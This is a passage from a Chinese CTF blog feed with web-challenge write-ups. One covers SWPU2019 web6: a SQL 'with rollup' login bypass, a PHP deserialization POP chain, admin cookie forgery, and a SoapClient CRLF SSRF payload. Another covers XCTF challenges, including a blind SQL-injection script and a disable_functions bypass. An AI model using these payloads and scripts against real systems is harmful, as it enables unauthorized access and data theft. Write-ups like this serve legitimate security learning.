alt><br>而我们只需要传存在的类跟方法即可。比如SplStack就是php标准库里数据结构类，push方法也是自然存在的。<br>所以上传1.jpg,在func.php调用<br><code>php://filter/resource=phar://upload/76d9f00467e5ee6abc3ca60892ef304e/f3ccdd27d2000e3f9255a7e3e2c48800.jpg</code>触发反序列化。</li></ul><p><del>这里我往buu的requestsbin打payload没收到</del>不止没收到，直接死在文件流那了。它报的我文件是ost-stream。命令执行失败。</p><p>用它的内网靶机就没事？好吧，还是有flag的hhh.<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/flag.PNG" alt></p><h2 id="SWPU2019-web6"><a href="#SWPU2019-web6" class="headerlink" title="SWPU2019 web6"></a>SWPU2019 web6</h2><p>上来一个sql的万能密码，用到了<code>with rollup</code>的trick<br>1’ or ‘1’=’1’  group by passwd with rollup having passwd is NULL – -<br>添加一个空列，进行结果判断NULL=false<br>绕过弱类型相等</p><p>进去后发现wsdl.php提供了不少接口，其中一个可以读文件<br>把可读的文件读一下<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include</span> (<span class="string">"encode.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"Service.php"</span>);</span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//phpinfo();</span></span><br><span class="line"></span><br><span class="line">$method = $_GET[<span class="string">'method'</span>]?$_GET[<span class="string">'method'</span>]:<span class="string">'index'</span>;</span><br><span class="line"><span class="comment">//echo 1231;</span></span><br><span class="line">$allow_method = <span class="keyword">array</span>(<span class="string">"File_read"</span>,<span class="string">"login"</span>,<span class="string">"index"</span>,<span class="string">"hint"</span>,<span class="string">"user"</span>,<span class="string">"get_flag"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!in_array($method,$allow_method))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow method"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($method===<span class="string">"File_read"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $param =$_POST[<span class="string">'filename'</span>];</span><br><span class="line">    $param2=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($method===<span class="string">"login"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $param=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        $param2 = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"method can use"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $method;</span><br><span class="line">$newclass = <span class="keyword">new</span> Service();</span><br><span class="line"><span class="keyword">echo</span> $newclass-&gt;$method($param,$param2);</span><br><span class="line"></span><br><span class="line">ob_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Surface.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'Service.php'</span>);</span><br><span class="line">    $ser = <span class="keyword">new</span> SoapServer(<span class="string">'Service.wsdl'</span>,<span class="keyword">array</span>(<span class="string">'soap_version'</span>=&gt;SOAP_1_2));</span><br><span class="line">    $ser-&gt;setClass(<span class="string">'Service'</span>);</span><br><span class="line">    $ser-&gt;handle();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>se.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$param)</span>  调用函数，显然可跟进到<span class="title">invoke</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $s1 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                    $s1();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($ke)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mod2[$ke];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span>  入手点，显然可跟进到<span class="title">__call</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> $mod3;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="keyword">$this</span>-&gt;mod3.<span class="keyword">$this</span>-&gt;mod1; 拼接,那么有字符串了</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span>  此处可<span class="title">ssrf</span>，到头了</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                session_start(); </span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                $a = <span class="keyword">array</span>(reset($_SESSION),<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">                <span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b,$a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;&#123;<span class="keyword">$this</span>-&gt;str2&#125;(); 有字符串了，只有他能调用对象的方法，当然是ssrf</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = $_POST[<span class="string">'aa'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>encode.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">en_crypt</span><span class="params">($content,$key)</span></span>&#123;</span><br><span class="line">    $key    =    md5($key);</span><br><span class="line">    $h      =    <span class="number">0</span>;</span><br><span class="line">    $length    =    strlen($content);</span><br><span class="line">    $swpuctf      =    strlen($key);</span><br><span class="line">    $varch   =    <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($h == $swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch .= $key&#123;$h&#125;;</span><br><span class="line">        </span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $swpu  =  <span class="string">''</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $swpu .= chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($swpu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到不可读的方法 <code>get_flag</code>，得知要点：</p><p>get_flag  only admin in 127.0.0.1 can get_flag</p><ul><li>ssrf needed</li><li>POPchain needed</li><li>decrypt and be admin</li></ul><p>先看popchain</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bb-&gt;__destruct &#x2F;&#x2F;$mod1 为aa对象</span><br><span class="line">    -&gt;aa -&gt;_call()-&gt;$s1(); &#x2F;&#x2F;$需要调用的$s1是个对象</span><br><span class="line">        -&gt;cc-&gt; __invoke()-&gt; &#x2F;&#x2F;拼接，需要属性是字符串</span><br><span class="line">            ee-&gt;_toString()-&gt; &#x2F;&#x2F;$str1是dd对象-&gt;getflag()</span><br><span class="line">                dd-&gt;getflag()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> $mod3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">&#125;</span><br><span class="line">$ee=<span class="keyword">new</span> ee();</span><br><span class="line">$ee-&gt;str1=<span class="keyword">new</span> dd();</span><br><span class="line">$ee-&gt;str2=<span class="string">'getflag'</span>;</span><br><span class="line">$cc=<span class="keyword">new</span> cc();</span><br><span class="line">$cc-&gt;mod3=<span class="string">'1'</span>;</span><br><span class="line">$cc-&gt;mod1=$ee;</span><br><span class="line">$aa=<span class="keyword">new</span> aa();</span><br><span class="line">$aa-&gt;mod1=$cc;</span><br><span class="line">$aa-&gt;mod2=<span class="keyword">array</span>(<span class="string">'test2'</span>=&gt;&amp;$aa-&gt;mod1);</span><br><span class="line">$bb=<span class="keyword">new</span> bb();</span><br><span class="line">$bb-&gt;mod1=$aa;</span><br><span class="line"></span><br><span class="line">$ee-&gt;str1-&gt;b=<span class="string">'call_user_func'</span>;</span><br><span class="line">$ee-&gt;str1-&gt;flag=<span class="string">'get_flag'</span>;</span><br><span class="line">$sa=serialize($bb);</span><br><span class="line"><span class="keyword">echo</span> $sa;</span><br></pre></td></tr></table></figure><p>这题类似bestphp’srevenge，所以前面的链好了后可以直接把getflag()用到的两个参数填好。原理是一样的。<br>链子好了,回头看看解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">de_crypt</span><span class="params">($swpu,$key)</span></span>&#123;</span><br><span class="line">    $swpu=base64_decode($swpu);</span><br><span class="line">    $key=md5($key);</span><br><span class="line">    $h=<span class="number">0</span>;</span><br><span class="line">    $length=strlen($swpu);</span><br><span class="line">    $swpuctf=strlen($key);</span><br><span class="line">    $varch=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$length;$j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($h==$swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch.=$key&#123;$h&#125;;</span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $content=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$length;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $content.= chr(ord($swpu&#123;$j&#125;) - (ord($varch&#123;$j&#125;))+<span class="number">256</span> % <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解码cookie得到<code>xiaoC:3</code><br>那就加密伪造admin<br><code>admin:1 xZmdm9NxaQ==</code></p><p>现在差一个Sopa打127.0.0.1调用getflag<br>需要注意的是<br>interface.php已经有现成的soap接口了，所以不能直接访问index.php调用get_flag。而是通过call_user_func调用SoapClient类的get_flag方法即调用了Service类的get_flag方法<br>先将数据写入session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/interface.php'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: user=xZmdm9NxaQ=='</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span>=&gt;<span class="string">'byc^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers),<span class="string">'uri'</span>=&gt;<span class="string">'aabb'</span>));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用表单传进session</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://04bda212-e690-478a-99d5-846e353f75ca.node3.buuoj.cn/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>加上上面链子的payload.即可get_flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF高校战“疫”网络安全分享赛</title>
      <link href="2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/"/>
      <url>2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>萌新第一次xctf自闭了。<br>第一次代表X1c打比赛，结果输出贼低，几乎就完整贡献一道题。有几道基本到位了也没做出来，没能分担队友压力…..但是最后队伍拿到第8名挺强的，其他师傅太给力了，中间有段时间还冲到了第四名，只不过大家因为要上课就都睡觉去了hhh。</p><p>所以趁着其他战队的wp出来自己先把几道自己当时接触了的题目以及没完整做出来的题目小结下。顺便提醒自己要加紧查漏补缺了。</p><a id="more"></a><h1 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h1><p>这道题基本算是完整做出来了。只是考点有点坑。都知道有注入但是就是难找。<br>实际上在注册页面有注释提醒type参数110时会不一样。并且之前登陆进去页面中有出题人提示的”注册账户也有等级之分”，所以可以在注册时就将type调为110。登陆进去就可以在search.php进行注入了。<br>(但是这个区分点就很无语，没啥含金量，偏偏又能难倒一堆人)</p><p>进去后一个普通的盲注了。只不过过滤了关键字置为空，可以双写绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">'http://121.37.179.47:1001/regist.php'</span></span><br><span class="line">url2=<span class="string">'http://121.37.179.47:1001/login.php'</span></span><br><span class="line">url3=<span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">s.post(url, data=&#123;<span class="string">'email'</span>: <span class="string">'byc_409'</span>, <span class="string">'pass'</span>: <span class="string">'123'</span>, <span class="string">'repass'</span>: <span class="string">'123'</span>, <span class="string">'type'</span>: <span class="string">'110'</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        s.post(url2, data=&#123;<span class="string">'email'</span>: <span class="string">'byc_409'</span>, <span class="string">'pass'</span>: <span class="string">'123'</span>&#125;)<span class="comment">#admin,fl4g,jd,user</span></span><br><span class="line">        payload = <span class="string">"1' or ascii(substr((selselectect group_concat(flag) frfromom fl4g),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"#"</span></span><br><span class="line">        r = s.post(url3, data=&#123;<span class="string">'flag'</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'no'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注出来只能得到账号密码(md5)，加上一个只有一部分的flag。只能继续进后台了。由于之前扫目录得到过admin.html。直接登录，发现是个扫描器<img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/1.PNG" alt="sql"><br>由于我前几天才接受的校队考核就是mysql load data infile的知识点，加上跑出来的flag是mysql-rogue-server，马上就能想到使用Mysql-Rogue-Server解决。解决方法很简单就是在服务器跑脚本就完了，但其实原理挺麻烦的。简单解释就是我们利用 load data infile的特性，可以用脚本伪造mysql传输数据包。只要这样就能返回服务器上的任意文件读取。<br>不过这题python脚本不大行的样子，用php脚本解决问题，读<code>flag.php</code>就得到剩下的flag。</p><h1 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a>PHP-UAF</h1><p>这题基本没啥技术难度，主要就是跑脚本了。本来随便测测的，发现禁用系统函数以及一个open_basedir。那就看下目录吧，发现突然多了好多php文件，给师傅看看发现就是上次公益赛easy_thinking的bypass脚本<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>那就用就完事了。直接copy函数用了后包含一下命令执行即可。<br>这题郁师傅随手做的，貌似因为搅屎原因刷了十几分钟才出来。<br>至于为什么会搅屎，随便放一下比赛时读到的别队大佬php命令<br><img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/2.PNG" alt></p><h1 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h1><p>这题不想说啥了。就是坑。赛后看看Nu1l的解题脚本后，发现要用<br><code>\u\n\i\o\n \s\e\l\e\c\t</code>这种语句。所以它源码应该是直接把参数<br>time拿进函数date一把梭………..<br><img 